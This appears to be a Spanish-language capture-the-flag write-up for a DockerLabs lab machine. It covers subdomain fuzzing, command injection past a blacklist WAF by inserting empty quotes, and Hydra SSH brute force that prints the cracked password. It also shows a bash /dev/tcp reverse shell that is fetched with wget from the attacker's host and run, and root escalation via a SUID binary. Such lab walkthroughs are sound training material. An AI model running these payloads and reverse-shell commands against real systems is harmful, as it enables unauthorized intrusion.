**Plataforma:** DockerLabs **Categoría:** Linux / Web / Command Injection / WAF Bypass **IP objetivo:** 172.17.0.2

---
## Resumen

Máquina Linux con un panel de administración web que ejecuta comandos del sistema operativo a través de un Directory Inspector protegido por WAF. Mediante la técnica de Quote Insertion se bypasea la lista negra del WAF, permitiendo descargar y ejecutar una reverse shell como `www-data`. La escalada a usuario se consigue a través de una wordlist encontrada en el sistema y fuerza bruta SSH. La escalada a root aprovecha un binario personalizado con bit SUID mal configurado.

---

## 1. Reconocimiento

```bash
sudo nmap -sS -p- --open --min-rate 5000 172.17.0.2 -oG puertos
nmap -sVC -p22,80 172.17.0.2
```

Servicios encontrados:

- 22/tcp → OpenSSH 9.6p1 (Ubuntu)
- 80/tcp → Apache 2.4.58 — título: "internal — Secure Backup Infrastructure"

Se añade al `/etc/hosts`:

```
172.17.0.2 internal.dl
```

---

## 2. Enumeración web

La página principal no contiene vectores de ataque directos. Se lanza fuzzing de subdominios con ffuf:

```bash
ffuf -u http://FUZZ.internal.dl -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt

backup      [Status: 200, Size: 22554, Words: 4271, Lines: 812, Duration: 1ms]
```

Subdominio encontrado: `backup.internal.dl`

Se añade al `/etc/hosts`:

```
172.17.0.2 backup.internal.dl
```

---

## 3. Análisis del subdominio backup

El subdominio contiene un **Directory Inspector** — un panel que ejecuta `ls` sobre rutas del sistema con acceso directo a una shell (`SHELL EXEC`). La terminal muestra `root@sysvault`, lo que sugiere ejecución con privilegios elevados del lado del servidor.

Al intentar encadenar comandos, el WAF los bloquea:

```
/var/backups | whoami  →  Request blocked by WAF
/var/backups; id       →  Request blocked by WAF
```

El WAF usa una lista negra de comandos y separadores, bloqueando tanto los separadores (`;`, `|`, `&&`, `` ` ``) como los comandos (`id`, `whoami`, etc.) de forma independiente.

---

## 4. Bypass del WAF — Quote Insertion

El WAF compara strings exactos contra su blacklist. Al insertar comillas vacías (`''`) dentro del comando, el string que analiza el WAF no coincide con ninguna entrada de la lista negra. Sin embargo, el shell interpreta las comillas vacías como nada y ejecuta el comando correctamente.

Verificación del bypass:

```
/var/backups | who''ami
```

```
root@sysvault:~# ls -lah /var/backups | who''ami ✓
www-data
```

RCE confirmado como `www-data`.

---

## 5. Reverse Shell

Se crea el script de reverse shell localmente:

```bash
#!/bin/bash
/bin/bash -i >& /dev/tcp/172.17.0.1/4444 0>&1
```

Se sirve con un servidor HTTP desde la máquina atacante:

```bash
python3 -m http.server 8080
```

Se descarga en el objetivo mediante el bypass del WAF:

```
/var/backups | wg''et http://172.17.0.1:8080/shell -O /tmp/shell
```

Se pone el listener en la máquina atacante:

```bash
nc -lvnp 4444
```

Se ejecuta la reverse shell:

```
/var/backups | ba''s''h /tmp/shell
```

Shell recibida como `www-data`.

---

## 6. Escalada a usuario vault

Explorando el sistema se encuentra una wordlist oculta en `/opt`:

```bash
ls -a /opt
# .vault_pass.txt  vaultlibs
```

```bash
cat /opt/.vault_pass.txt
```

El archivo contiene 20 contraseñas candidatas. Revisando `/etc/passwd` se identifica un usuario del sistema:

```bash
cat /etc/passwd | grep bash
# vault:x:1001:1001:,,,:/home/vault:/bin/bash
```

Se lanza fuerza bruta SSH contra el usuario `vault`:

```bash
hydra -l vault -P /opt/.vault_pass.txt ssh://172.17.0.2 -t 32 -I
```

Credencial encontrada:

```
vault : Yk8$pZ5@cN4!
```

```bash
ssh vault@172.17.0.2
```

---

## 7. Escalada a root

`sudo` no está disponible para `vault`. Se buscan binarios con bit SUID:

```bash
find / -perm -4000 2>/dev/null
```

Se identifica un binario personalizado inusual:

```
/usr/local/bin/vaultctl
```

Permisos:

```
-rwsr-xr-- 1 root vault 16136 Feb 25 15:00 /usr/local/bin/vaultctl
```

El bit SUID (`s` en los permisos del propietario) hace que el binario se ejecute con el UID del propietario del archivo — en este caso `root`. Además, el grupo `vault` tiene permisos de ejecución, por lo que el usuario `vault` puede ejecutarlo directamente.

```bash
/usr/local/bin/vaultctl
```

```bash
id
# uid=0(root) gid=0(root) groups=0(root),100(users),1001(vault)
```

Root obtenido. Flag en `/root/flag.txt` o `/flag.txt`.

---

## Cadena de ataque

```
Gobuster vhost → backup.internal.dl
        ↓
Directory Inspector con SHELL EXEC
        ↓
WAF bypass con Quote Insertion (who''ami)
        ↓
wget del script de reverse shell vía WAF bypass
        ↓
Reverse shell como www-data
        ↓
/opt/.vault_pass.txt → wordlist de contraseñas
        ↓
Hydra SSH → vault:Yk8$pZ5@cN4!
        ↓
SUID en /usr/local/bin/vaultctl → root
```

---

## Técnicas utilizadas

**Quote Insertion (WAF Bypass)**

Insertar comillas vacías `''` dentro de un comando rompe el string que el WAF analiza contra su lista negra, pero el shell lo interpreta como el comando original sin alteraciones.

```bash
who''ami  →  WAF ve "who''ami" (no está en la blacklist)
           →  Shell ejecuta "whoami"
```

**SUID Abuse**

El bit SUID en un binario ejecutable hace que el proceso corra con los privilegios del propietario del archivo (normalmente root), independientemente del usuario que lo invoque. Es uno de los vectores de escalada más comunes en Linux — siempre comprobar la lista de binarios SUID con `find / -perm -4000 2>/dev/null` y validar cada resultado en GTFOBins o analizarlo manualmente.

---

## Lecciones aprendidas

- Los WAFs basados en listas negras de strings exactos son bypasseables mediante ofuscación simple — Quote Insertion, codificación base64, o variables de entorno como `$IFS` son técnicas estándar para evadir este tipo de filtros.
- Siempre buscar archivos ocultos (`.archivo`) en directorios como `/opt`, `/tmp`, o el home del usuario — en entornos de práctica suelen contener credenciales o pistas.
- Un binario SUID personalizado (no estándar del sistema) es siempre una señal de alerta prioritaria — no aparece en GTFOBins pero al ejecutarlo directamente puede escalar privilegios si está mal implementado.
- La fuerza bruta SSH con una wordlist pequeña y específica (20 entradas) es mucho más eficiente que tirar rockyou a ciegas — siempre que tengas una lista de candidatos concreta, úsala primero.